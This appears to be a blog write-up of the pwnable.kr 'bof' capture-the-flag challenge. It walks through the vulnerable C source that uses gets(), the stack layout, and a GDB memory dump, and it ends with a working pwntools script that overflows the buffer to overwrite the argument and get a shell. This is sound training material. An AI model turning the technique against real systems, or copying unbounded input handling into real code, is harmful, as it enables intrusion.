+++
date = '2025-12-13T23:29:13+02:00'
draft = false
title = 'Bof'
+++
# Bof

this pwnable seems a lil straightforward 
i expect a buffer overflow basicaly
lets dive in

### source code analysis:

```c
#include <stdio.h>
#include <string.h>
#include <stdlib.h>
void func(int key){
	char overflowme[32];
	printf("overflow me : ");
	gets(overflowme);	// smash me!
	if(key == 0xcafebabe){
		setregid(getegid(), getegid());
		system("/bin/sh");
	}
	else{
		printf("Nah..\n");
	}
}
int main(int argc, char* argv[]){
	func(0xdeadbeef);
	return 0;
}


```

the main function calls func(0xdeafbeef)
we have a vulnerable buffer of [32] chars
we can overflow it because there is no safety mechanism + the function uses gets() which is considered unsafe since there is no limit to the input you can give it ,

we need to overflow the buffer in order to change the caller parameters into 0xcafebabe

in assembly when we call a function, we push the args first the the return address gets pushed onto the stack be 'call' command and then we create a stack frame by storing ebp instead of rsp and then substracting from rsp space for our local variables

### The Map (High to Low)

```text
      High Addresses (0xFFFFFFFF)
    +--------------------------------+
    |           ...                  |
    |      [ Function Args ]         |  <-- Placed by CALLER
    |   Argument 2 (int y)           |
    |   Argument 1 (int x)           |
    +--------------------------------+
    |      [ Return Address ]        |  <-- Pushed by 'CALL' instruction
    +--------------------------------+
    |      [ Saved EBP ]             |  <-- Start of CALLEE Frame
    +--------------------------------+  <-- EBP (Base Pointer) points here
    |           ...                  |
    |      [ Local Variables ]       |
    |   Local Var 1 (char buffer)    |
    |   Local Var 2 (int index)      |
    +--------------------------------+  <-- ESP (Stack Pointer) points here
      Low Addresses (0x00000000)

```

the idea here is to overflow 32 for the buffer .. here we dont need to save the return address because we just need the flag,
so +8 more bytes to overflow the saved rbp and then we put 0xcafebabe instead of 0xdeadbeef , lets give it a go first with some cycled input, i tried running this into the function 

Here is the raw memory dump from GDB  just after sending the cyclic pattern of 40. You can clearly see the path from our input to the target.

```text
0xffffd4f0: 0xf7ffd608  0x00000020  0x00000000  0x61616161  <-- [Start of Buffer] ('aaaa')
0xffffd500: 0x61616162  0x61616163  0x61616164  0x61616165
0xffffd510: 0x61616166  0x61616167  0x61616168  0x61616169
0xffffd520: 0x6161616a  0xffffd600  0xffffd548  0x565562c5  <-- [Saved EBP & Return Address]
0xffffd530: 0xdeadbeef  0xf7fbe66c  0xf7fbeb30  0x565562b3  <-- [TARGET VARIABLE] (Argument)
0xffffd540: 0x00000001  0xffffd560  0xf7ffd020  0xf7d9e519
0xffffd550: 0xffffd757  0x00000070  0xf7ffd000  0xf7d9e519
0xffffd560: 0x00000001  0xffffd614

however despite what it seems its not enough seems like there's extra padding to consider for, 
arguement is at 0xffffd530
buffer starts at 0xffffd4f0
so we need 0x34 or 52 in order to overrite our desired value
```

```python

from pwn import *

r = remote('pwnable.kr', 9000)

# 2. Build the Payload
# offset: 52 bytes (32 buffer + 20 padding like we founded out)
# target: 0xcafebabe (Little Endian)
payload = b"A" * 52
payload += p32(0xcafebabe)

# sendline cause it uses gets an stdin input

r.sendline(payload)

#it may not work but we still can just use cat flag inside the shell
r.sendline(b'cat flag')

#shell popped
r.interactive()

```
and we get the flag Daddy_I_just_pwn****